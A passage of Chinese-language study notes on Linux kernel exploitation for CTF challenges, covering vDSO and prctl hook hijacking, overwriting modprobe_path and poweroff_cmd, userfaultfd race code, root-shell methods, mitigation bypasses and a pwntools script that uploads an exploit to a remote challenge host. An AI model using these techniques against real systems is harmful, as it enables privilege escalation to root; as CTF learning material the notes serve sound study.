RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="vDSO："><a href="#vDSO：" class="headerlink" title="vDSO："></a>vDSO：</h2><p>内核态与用户态共享数据段，内核态有<code>rw</code>权限（高版本无<code>w</code>权限），用户态有<code>rx</code>权限。</p>
<ol>
<li>内核态写<code>shellcode</code>，用户态调用。</li>
<li>内核态调用<code>set_memory_rw</code>函数更改<code>vDSO</code>段权限，用户态写<code>shellcode</code>，用户态调用。</li>
</ol>
<p><code>dump</code>找偏移方法：</p>
<p>爆破地址方法：</p>
<ol>
<li>通过<code>ELF Sigrature</code>。</li>
<li>通过<code>gettimeofday</code>字符串：先在用户态找到<code>gettimeofday</code>字符串相对于开头的偏移，再到内核态爆破。</li>
</ol>
<p>具体参照<code>2015csaw_stringipc</code>解法二。</p>
<h2 id="prctl："><a href="#prctl：" class="headerlink" title="prctl："></a>prctl：</h2><h3 id="32位："><a href="#32位：" class="headerlink" title="32位："></a>32位：</h3><p>先泄露<code>kernel_base</code>。</p>
<p>劫持<code>task_prctl</code>为<code>ser_memmory_rw</code>，调用<code>prctl</code>并且传入<code>vDSO</code>地址，之后使用和劫持<code>vDSO</code>同样的方法。</p>
<h3 id="64位："><a href="#64位：" class="headerlink" title="64位："></a>64位：</h3><p>因为有参数截断问题，<code>security_task_prctl</code>函数的第一个参数为<code>int</code>型，开启了<code>smep&amp;smap</code>攻击会失效。</p>
<p>先泄露<code>kernel_base</code>，目前见过的方法为通过<strong>内核栈上脏数据泄露</strong>和<strong>泄露vDSO</strong>。</p>
<p><code>prctl</code> -&gt; <code>security_task_prctl</code> -&gt; <code>task_prctl</code></p>
<p>通过动态调试找到<code>task_prctl</code>的偏移，劫持<code>task_prctl</code>为<code>poweroff_work_func</code>。</p>
<p><code>poweroff_work_func()</code> -&gt; <code>__orderly_poweroff</code> -&gt; <code>run_cmd()</code> -&gt; <code>call_usermodehelper()</code></p>
<p>通过动态调试找到<code>poweroff_cmd</code>字符串的偏移，将其改为我们想执行的命令。</p>
<p>限制：有的内核中没有<code>security_task_prctl</code>，有的内核不允许更改<code>hook</code>。</p>
<h2 id="call-usermodehelper："><a href="#call-usermodehelper：" class="headerlink" title="call_usermodehelper："></a>call_usermodehelper：</h2><p>不需要劫持函数虚表，不需要传参数那么麻烦，只需要修改变量即可提权。</p>
<p>后四种暂未知道如何触发：</p>
<p><strong>（1） modprobe_path</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /kernel/kmod.c</span></span><br><span class="line"><span class="keyword">char</span> modprobe_path[KMOD_PATH_LEN] = <span class="string">"/sbin/modprobe"</span>;</span><br><span class="line"><span class="comment">// /kernel/kmod.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">call_modprobe</span><span class="params">(<span class="keyword">char</span> *module_name, <span class="keyword">int</span> wait)</span> </span></span><br><span class="line">    argv[0] = modprobe_path;</span><br><span class="line">    info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line">                     <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);</span><br><span class="line"><span class="comment">// /kernel/kmod.c</span></span><br><span class="line"><span class="keyword">int</span> __request_module(<span class="keyword">bool</span> wait, <span class="keyword">const</span> <span class="keyword">char</span> *fmt, ...)</span><br><span class="line">    ret = call_modprobe(module_name, wait ? UMH_WAIT_PROC : UMH_WAIT_EXEC);</span><br></pre></td></tr></table></figure>
<p>__request_module - try to load a kernel module</p>
<p>触发：可通过执行错误格式的elf文件来触发执行<code>modprobe_path</code>指定的文件。</p>
<p><strong>（2）poweroff_cmd</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /kernel/reboot.c</span></span><br><span class="line"><span class="keyword">char</span> poweroff_cmd[POWEROFF_CMD_PATH_LEN] = <span class="string">"/sbin/poweroff"</span>;</span><br><span class="line"><span class="comment">// /kernel/reboot.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">run_cmd</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmd)</span></span></span><br><span class="line"><span class="function">    argv </span>= argv_split(GFP_KERNEL, cmd, <span class="literal">NULL</span>);</span><br><span class="line">    ret = call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_EXEC);</span><br><span class="line"><span class="comment">// /kernel/reboot.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __orderly_poweroff(<span class="keyword">bool</span> force)    </span><br><span class="line">    ret = run_cmd(poweroff_cmd);</span><br></pre></td></tr></table></figure>
<p>触发：执行<code>__orderly_poweroff()/poweroff_work_func</code>即可。</p>
<p><strong>（3）uevent_helper</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /lib/kobject_uevent.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_UEVENT_HELPER</span></span><br><span class="line"><span class="keyword">char</span> uevent_helper[UEVENT_HELPER_PATH_LEN] = CONFIG_UEVENT_HELPER_PATH;</span><br><span class="line"><span class="comment">// /lib/kobject_uevent.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">init_uevent_argv</span><span class="params">(struct kobj_uevent_env *env, <span class="keyword">const</span> <span class="keyword">char</span> *subsystem)</span></span></span><br><span class="line"><span class="function"></span>&#123;  ......</span><br><span class="line">    env-&gt;argv[<span class="number">0</span>] = uevent_helper; </span><br><span class="line">  ...... &#125;</span><br><span class="line"><span class="comment">// /lib/kobject_uevent.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kobject_uevent_env</span><span class="params">(struct kobject *kobj, <span class="keyword">enum</span> kobject_action action,</span></span></span><br><span class="line"><span class="function"><span class="params">               <span class="keyword">char</span> *envp_ext[])</span></span></span><br><span class="line"><span class="function"></span>&#123;......</span><br><span class="line">    retval = init_uevent_argv(env, subsystem);</span><br><span class="line">    info = call_usermodehelper_setup(env-&gt;argv[<span class="number">0</span>], env-&gt;argv,</span><br><span class="line">                         env-&gt;envp, GFP_KERNEL,</span><br><span class="line">                         <span class="literal">NULL</span>, cleanup_uevent_env, env);</span><br><span class="line">......&#125;</span><br></pre></td></tr></table></figure>
<p><strong>（4）ocfs2_hb_ctl_path</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /fs/ocfs2/stackglue.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> ocfs2_hb_ctl_path[OCFS2_MAX_HB_CTL_PATH] = <span class="string">"/sbin/ocfs2_hb_ctl"</span>;</span><br><span class="line"><span class="comment">// /fs/ocfs2/stackglue.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ocfs2_leave_group</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *group)</span></span></span><br><span class="line">    argv[0] = ocfs2_hb_ctl_path;</span><br><span class="line">    ret = call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_PROC);</span><br></pre></td></tr></table></figure>
<p><strong>（5）nfs_cache_getent_prog</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /fs/nfs/cache_lib.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> nfs_cache_getent_prog[NFS_CACHE_UPCALL_PATHLEN] =</span><br><span class="line">                <span class="string">"/sbin/nfs_cache_getent"</span>;</span><br><span class="line"><span class="comment">// /fs/nfs/cache_lib.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nfs_cache_upcall</span><span class="params">(struct cache_detail *cd, <span class="keyword">char</span> *entry_name)</span></span></span><br><span class="line">    char *argv[] = &#123;</span><br><span class="line">        nfs_cache_getent_prog,</span><br><span class="line">        cd-&gt;name,</span><br><span class="line">        entry_name,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    &#125;;</span><br><span class="line">    ret = call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_EXEC);</span><br></pre></td></tr></table></figure>
<p><strong>（6）cltrack_prog</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /fs/nfsd/nfs4recover.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> cltrack_prog[PATH_MAX] = <span class="string">"/sbin/nfsdcltrack"</span>;</span><br><span class="line"><span class="comment">// /fs/nfsd/nfs4recover.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nfsd4_umh_cltrack_upcall</span><span class="params">(<span class="keyword">char</span> *cmd, <span class="keyword">char</span> *arg, <span class="keyword">char</span> *env0, <span class="keyword">char</span> *env1)</span></span></span><br><span class="line">    argv[0] = (char *)cltrack_prog;</span><br><span class="line">    ret = call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_PROC);</span><br></pre></td></tr></table></figure>
<h2 id="userfaultfd：-1"><a href="#userfaultfd：-1" class="headerlink" title="userfaultfd："></a>userfaultfd：</h2><p>我们的虚拟内存和物理内存(RAM)存在着映射关系，每当我们对虚拟地址的内存进行读写时，内核都会通过<strong>页表</strong>来查找对应的物理内存帧，若是没有对应的帧，就会触发<strong>缺页中断</strong>。</p>
<p>内核提供了用户自定义缺页中断处理方式的接口，也就是<code>userfaultfd</code>，我们有时候为了利用漏洞不得不造成缺页中断，我们就可以使用<code>userfaultfd</code>来触发中断后进入我们自定义的流程从而引发竞争，例如：在写的时候触发中断，然后我们先<code>delete</code>一下，再继续完成正常写的操作，等于有了<code>UAF</code>，常规用法如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handle</span><span class="params">(<span class="keyword">void</span>* uffd)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">mypollfd</span>;</span></span><br><span class="line"></span><br><span class="line">    mypollfd.fd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)uffd;</span><br><span class="line">    mypollfd.events = POLLIN;</span><br><span class="line">    <span class="keyword">int</span> re = poll(&amp;mypollfd,<span class="number">1</span>,<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span>(re &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Catch error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]Struck the pagefault!!!"</span>);</span><br><span class="line">    sleep(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_uffd</span><span class="params">(<span class="keyword">uint64_t</span> fault_page,<span class="keyword">uint64_t</span> fault_page_size)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">myapi</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">myuffd</span>;</span></span><br><span class="line">    <span class="keyword">pthread_t</span> pt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> uffd = syscall(__NR_userfaultfd,O_CLOEXEC|O_NONBLOCK);</span><br><span class="line"></span><br><span class="line">    myapi.api = UFFD_API;</span><br><span class="line">    myapi.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(uffd,UFFDIO_API,&amp;myapi) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Api error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    myuffd.range.start = fault_page;</span><br><span class="line">    myuffd.range.len = fault_page_size;</span><br><span class="line">    myuffd.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(uffd,UFFDIO_REGISTER,&amp;myuffd) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Register error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> re = pthread_create(&amp;pt,<span class="literal">NULL</span>,handle,(<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span>(re != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Create pthread error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* mmap_addr = mmap(<span class="literal">NULL</span>,<span class="number">0x1000</span>,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">uint64_t</span> fault_page = mmap_addr;      <span class="comment">//监视内存起始地址</span></span><br><span class="line"><span class="keyword">uint64_t</span> fault_page_size = <span class="number">0x1000</span>;    <span class="comment">//监视内存长度</span></span><br><span class="line">register_uffd(fault_page,fault_page_size);</span><br><span class="line"><span class="comment">//一旦被监视的内存区域触发缺页中断，poll会catch到信号，然后会进入之后的用户自定义流程，在这里是使此进程sleep(1000)，我们就可以在其他进程继续操作。当然这只是最简单的操作。</span></span><br></pre></td></tr></table></figure>
<h2 id="race：-1"><a href="#race：-1" class="headerlink" title="race："></a>race：</h2><p>内核与用户态不同，我们可以随意控制<code>exp</code>这个进程，也就意味着我们可以产生无限多的子进程和线程，这也就导致了竞争问题，即<code>double petch</code>。当看到启动内核脚本开启了：<code>core=2 thread=2</code>等非<code>1</code>时就需要考虑到竞争的可能性。</p>
<p>这类题目难度较大，也较为灵活，需要对题目的细节有较深的理解，理清思路为关键。可用列表先理清楚思路。</p>
<table>
<thead>
<tr>
<th>thread1</th>
<th>thread2</th>
</tr>
</thead>
<tbody>
<tr>
<td>。。。</td>
<td>。。。</td>
</tr>
<tr>
<td>。。。</td>
<td>。。。</td>
</tr>
<tr>
<td>。。。</td>
<td>。。。</td>
</tr>
</tbody>
</table>
<h2 id="内核利用的核心："><a href="#内核利用的核心：" class="headerlink" title="内核利用的核心："></a>内核利用的核心：</h2><p><strong>如何获取一个具有<code>root</code>权限的进程开启的<code>shell</code>？</strong></p>
<p><code>root</code>权限的<code>shell</code>必然是<code>root</code>权限的进程调用产生的，所以就有了以下几个办法：</p>
<ol>
<li>让当前进程的权限提升为<code>root</code>，也就是对<code>exp</code>这个进程提权，然后自己运行<code>system(&quot;/bin/sh&quot;)</code>。一般有改当前进程的<code>cred</code>结构体前28字节为全0，和<code>commit_creds(prepare_kernel_cred(0))</code>两种办法。</li>
<li>在当前低权限进程（也就是在exp中）监听一个端口，让某个具有<code>root</code>权限的进程反弹<code>shell</code>连接此端口，这样我们也会获得一个具有<code>root</code>权限的<code>shell</code>。</li>
<li>利用内核中已有的包装好的提权函数，想办法控制其参数并触发它，这里<code>call_usermodehelper</code>使用较多，也衍生出了<code>poweroff_cmd</code>，<code>modprobe_path</code>等变种方法。</li>
</ol>
<h2 id="内存映射："><a href="#内存映射：" class="headerlink" title="内存映射："></a>内存映射：</h2><p>未开启<code>kalsr</code>的默认情况：</p>
<p><img src="https://i.loli.net/2020/02/09/NabmUSIeAxZ6w9J.png" alt="x1.PNG"></p>
<p>我们可以看到：</p>
<ul>
<li><code>0x0000,0000,0000,0000 ~ 0x0000,7fff,ffff,f000</code>为用户态空间。</li>
<li><code>0x0000,7fff,ffff,f000 ~ 0x0000,8000,0000,0000</code>为保护空间。</li>
<li><code>0xffff,8000,0000,0000 ~ 0xffff,8800,0000,0000</code>为无关性地址。</li>
<li><code>0xffff,8800,0000,0000 ~ 0xffff,c800,0000,0000</code>为内核态的<strong>内存区</strong>，例如<code>kmalloc</code>，<code>kzalloc</code>之类申请的内存都在这一块区域。</li>
<li><code>0xffff,c900,0000,0000 ~ 0xffff,e900,0000,0000</code>为内核态的<code>vmalloc</code>映射区。</li>
<li><code>0xffff,ffff,8000,0000 ~ 0xffff,ffff,a000,0000</code>为内核态的<strong>内核主体映射区</strong>，也就是<code>vmlinux</code>加载的地址，内部含有代码与数据。</li>
<li><code>0xffff,ffff,a000,0000 ~ 0xffff,ffff,ff60,0000</code>为内核态的<strong>内核模块映射区</strong>，也就是<code>.ko</code>文件加载的地址，内部含有代码与数据。</li>
<li><code>0xffff,ffff,ff60,0000 ~ 0xffff,ffff,ff60,1000</code>为<code>vsyscall</code>地址，用户态可访问的且地址固定的一块区域。</li>
</ul>
<p>但是我尝试了开启了<code>kaslr</code>之后其实这个地址分布只能作为参考，并不一定准确。</p>
<p><code>physmap = 0xffff,8800,0000,0000</code> <code>slub/slab = 0xffff,8880,0000,0000</code></p>
<h2 id="打远程的脚本："><a href="#打远程的脚本：" class="headerlink" title="打远程的脚本："></a>打远程的脚本：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"35.221.78.115"</span></span><br><span class="line">PORT =  <span class="number">10022</span></span><br><span class="line"></span><br><span class="line">USER = <span class="string">"pwn"</span></span><br><span class="line">PW = <span class="string">"pwn"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compile</span><span class="params">()</span>:</span></span><br><span class="line">    log.info(<span class="string">"Compile"</span>)</span><br><span class="line">    os.system(<span class="string">"musl-gcc -w -s -static -o3 pwn2.c -o pwn"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    r.sendline(cmd)</span><br><span class="line">    r.recvuntil(<span class="string">"$ "</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    p = log.progress(<span class="string">"Upload"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"pwn"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">"$ "</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(encoded), <span class="number">300</span>):</span><br><span class="line">        p.status(<span class="string">"%d / %d"</span> % (i, len(encoded)))</span><br><span class="line">        exec_cmd(<span class="string">"echo \"%s\" &gt;&gt; benc"</span> % (encoded[i:i+<span class="number">300</span>]))</span><br><span class="line">        </span><br><span class="line">    exec_cmd(<span class="string">"cat benc | base64 -d &gt; bout"</span>)    </span><br><span class="line">    exec_cmd(<span class="string">"chmod +x bout"</span>)</span><br><span class="line">    </span><br><span class="line">    p.success()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></span><br><span class="line">    compile()</span><br><span class="line">    upload()</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        session = ssh(USER, HOST, PORT, PW)</span><br><span class="line">        r = session.run(<span class="string">"/bin/sh"</span>)</span><br><span class="line">        exploit(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = process(<span class="string">"./startvm.sh"</span>)</span><br><span class="line">        <span class="keyword">print</span> util.proc.pidof(r)</span><br><span class="line">        pause()</span><br><span class="line">        exploit(r)</span><br></pre></td></tr></table></figure>
<h2 id="保护机制："><a href="#保护机制：" class="headerlink" title="保护机制："></a>保护机制：</h2><h3 id="smep-PNX-amp-smap："><a href="#smep-PNX-amp-smap：" class="headerlink" title="smep/PNX &amp; smap："></a>smep/PNX &amp; smap：</h3><p><strong>用户态代码禁止执行</strong>与<strong>用户态数据禁止访问</strong>。</p>
<p>如果可以<code>ROP</code>的话，首先是<code>ropchain</code>需要放在内核内存中，其次是需要<code>mov cr4,0x6f0</code>。</p>
<h3 id="KASLR："><a href="#KASLR：" class="headerlink" title="KASLR："></a>KASLR：</h3><p>四个随机化：</p>
<p>内核栈基，内核模块基，内核代码基，内核堆基。</p>
<h3 id="KPTI："><a href="#KPTI：" class="headerlink" title="KPTI："></a>KPTI：</h3><p><code>kernel</code>为了缓解Meltdown漏洞的威胁，从<code>4.15</code>版本引入了<a href="https://zh.wikipedia.org/wiki/内核页表隔离" target="_blank" rel="noopener">KPTI</a>(Kernel Page Table Isolation) (a.k.a KAISER) 技术，将内核页表与用户态页表完全隔离，（通过<code>cr3</code>寄存器控制开关，也许可以修改<code>cr3</code>绕过？等待大佬研究），<code>iretq</code>返回用户态函数地址时会产生<code>SIGSEGV</code>错误，解决方法也很简单，用<code>get shell</code>函数catch这个<code>signal</code>即可。</p>
<h2 id="SLUB分配器："><a href="#SLUB分配器：" class="headerlink" title="SLUB分配器："></a>SLUB分配器：</h2><p>两个重要概念：<code>slub</code>分配器，<code>slab</code>缓冲区，伙伴系统。</p>
<p>几个重要结构体：<code>struct kmem_cache kmalloc_caches[12]</code></p>
<p><strong>struct kmem_cache</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">59</span> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> 60  * Slab cache management.</span></span><br><span class="line"><span class="comment"> 61  */</span></span><br><span class="line"> <span class="number">62</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line"> <span class="number">63</span>     <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span><span class="comment">//每个CPU对应的cpu_slab；</span></span><br><span class="line"> <span class="number">64</span>     <span class="comment">/* Used for retriving partial slabs etc */</span></span><br><span class="line"> <span class="number">65</span>     <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"> <span class="number">66</span>     <span class="keyword">unsigned</span> <span class="keyword">long</span> min_partial;<span class="comment">//每个node节点中部分空缓冲区数量不能低于这个值；如果小于这个值，空闲slab缓冲区不能够进行释放</span></span><br><span class="line"> <span class="number">67</span>     <span class="keyword">int</span> size;       <span class="comment">/* The size of an object including meta data */</span></span><br><span class="line"> <span class="number">68</span>     <span class="keyword">int</span> object_size;    <span class="comment">/* The size of an object without meta data */</span></span><br><span class="line"> <span class="number">69</span>     <span class="keyword">int</span> offset; <span class="comment">//空闲指针偏移量；/* Free pointer offset. */</span></span><br><span class="line"> <span class="number">70</span>     <span class="keyword">int</span> cpu_partial;    <span class="comment">/* Number of per cpu partial objects to keep around */</span> <span class="comment">//表示的是空闲对象数量，小于的情况下要去对应的node节点部分空链表中获取若干个部分空slab；</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//kmem_cache_order_objects 表示保存slab缓冲区的需要的页框数量的</span></span><br><span class="line"> <span class="comment">//order值和objects数量的值，通过这个计算出需要多少页框，oo是默认</span></span><br><span class="line"> <span class="comment">//值，max是最大值，min在分配失败的时候使用；</span></span><br><span class="line"> <span class="number">71</span>     <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line"> <span class="number">72</span> </span><br><span class="line"> <span class="number">73</span>     <span class="comment">/* Allocation and freeing of slabs */</span></span><br><span class="line"> <span class="number">74</span>     <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">max</span>;</span></span><br><span class="line"> <span class="number">75</span>     <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line"> <span class="number">76</span>     <span class="keyword">gfp_t</span> allocflags;   <span class="comment">/* gfp flags to use on each alloc */</span></span><br><span class="line"> <span class="number">77</span>     <span class="keyword">int</span> refcount;       <span class="comment">/* Refcount for slab cache destroy */</span></span><br><span class="line"> <span 